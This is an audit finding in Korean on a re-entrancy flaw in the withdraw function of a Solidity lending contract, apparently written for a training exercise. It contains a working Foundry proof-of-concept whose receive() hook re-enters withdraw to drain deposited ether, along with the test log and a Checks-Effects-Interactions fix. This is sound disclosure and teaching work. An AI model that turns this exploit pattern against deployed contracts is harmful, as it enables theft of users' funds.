# withdraw re-entrancy를 통한 담보 인출

## 설명

<aside>

### **키워드 : Vulnerability - Re-entrancy**

### **심각도 : Critical**

변수를 변화시키기 전에 call을 하기 때문에 re-entrancy를 활용하여 예치했던 본인의 ether와 대출금을 모두 인출하여 150%의 이득을 취할 수 있다.

</aside>

```solidity
uint256 borrowedETH = ((participateBooks[msg.sender].usdc_borrow *
    2) / _orcale.getPrice(address(0x0))) * 1e18;

require(
    participateBooks[msg.sender].eth_balance - borrowedETH >= amount
);

(bool success, ) = payable(msg.sender).call{value: amount}("");

participateBooks[msg.sender].eth_balance -= amount;
```

`participateBooks[msg.sender].eth_balance` 값을 비교한 뒤 값의 변화를 적용시키지 않고 call을 먼저 호출한다. 이로 인해 re-entrancy를 통해 ether를 원하는 만큼 전송할 수 있게 된다.

`participateBooks[msg.sender].eth_balance` 의 값이 변화하지 않으니 원하는 만큼 re-entrancy할 수 있다. 하지만 원하는 만큼 인출할 수는 없는데, call 이후 존재하는 `participateBooks[msg.sender].eth_balance -= amount;` 에 의해 내가 가진 이더보다 많이 인출할 경우 integer underflow가 발생할 수 있기 때문이다. revert가 나면 모든 상태 변화가 rollback 되므로, 해당 취약점으로는 최대 내가 예치한(담보로 맡긴)이더까지 인출할 수 있는 것이다.

## PoC

```solidity
function testPOC() external {
        vm.deal(address(this), 100000000 ether);
        lending.deposit{value: 100000000 ether}(address(0x00), 100000000 ether);
        dreamOracle.setPrice(address(0x0), 1 ether);

        console.log("before usdc", usdc.balanceOf(address(this)));
        (bool success, ) = address(lending).call(
            abi.encodeWithSelector(
                DreamAcademyLending.borrow.selector,
                address(usdc),
                50000000 ether
            )
        );
        console.log("after usdc", usdc.balanceOf(address(this)));
        count = 9;

        usdc.approve(address(lending), type(uint256).max);
        lending.withdraw(address(0x00), 10000000 ether);
        console.log(
            "Attack Result(usdc, ether), Lending's balance : ",
            usdc.balanceOf(address(this)),
            address(this).balance,
            address(lending).balance
        );
    }

    receive() external payable {
        while (count > 0) {
            --count;
            console.log("balance:", address(this).balance);
            lending.withdraw(address(0x00), 10000000 ether);
        }
    }
```

```solidity
Running 1 test for test/LendingTest.t.sol:Testx
[PASS] testPOC() (gas: 350645)
Logs:
  before usdc 100000000000000000000000000
  after usdc 100000000000000000000000000
  balance: 10000000000000000000000000
  balance: 20000000000000000000000000
...
  balance: 80000000000000000000000000
  balance: 90000000000000000000000000
  Attack Result(usdc, ether), Lending's balance :  100000000000000000000000000 100000000000000000000000000 1
```

현재 대출 기능이 완벽하게 구현되지 않아 정상적으로 동작하지 않기에 단순히 예치금을 다시 탈취하는 re-entrancy를 수행하는 PoC이다.

하지만 로직상 결국 `Check-Effects-Interactions` 가 아닌 `Check-Interactions-Effects` 순으로 구현되어 있기 때문에 이는 취약점으로 발현될 수 있다.

## 파급력

취약점을 악용한다면 최대 150%(예치금 100 + 대출 50)를 탈취할 수 있게 된다.

150% 보다 더 많은 금액을 탈취하려고 시도하면 이후 로직에 의해 integer underflow가 발생하여 revert가 일어나 rollback되기에 150%보다 더 많은 금액을 탈취할 수는 없지만 이를 수 차례 반복하면 사실상 무한정으로 인출이 가능한 것이나 다름없다.

Lending서비스의 담보물을 대출 상태와 관계 없이 출금 가능하기에 위험도를 매우 높음으로 판단하였다.

## 해결 방법

```solidity
require(
    participateBooks[msg.sender].eth_balance - borrowedETH >=
        amount
);

participateBooks[msg.sender].eth_balance -= amount;
(bool success, ) = payable(msg.sender).call{value: amount}("");
```

변수에 변화한 값을 먼저 적용시킨 뒤 call을 하여 `Checks-Effects-Interactions` 패턴으로 작성한다면 re-entrancy를 통해 허용된 ether보다 더 많은 ether 출금 시도를 막을 수 있게 된다.
